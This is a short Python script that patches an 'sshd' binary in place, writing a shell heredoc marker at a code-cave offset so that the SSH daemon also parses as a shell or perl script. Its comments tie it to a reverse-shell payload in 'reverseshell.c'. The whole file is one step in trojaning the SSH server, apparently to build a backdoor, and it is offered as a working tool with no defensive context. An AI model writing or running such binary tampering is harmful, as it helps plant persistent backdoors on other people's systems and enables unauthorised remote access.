#!/usr/bin/env python

# Make sshd also a shell or perl script so it can be piped 
# see bash char array in  reverseshell.c

CAVE=0x09
PAYLOAD = "\n<<L3T\n"

f=open('sshd','rb+')

f.seek(CAVE)
f.write(PAYLOAD)
f.close()

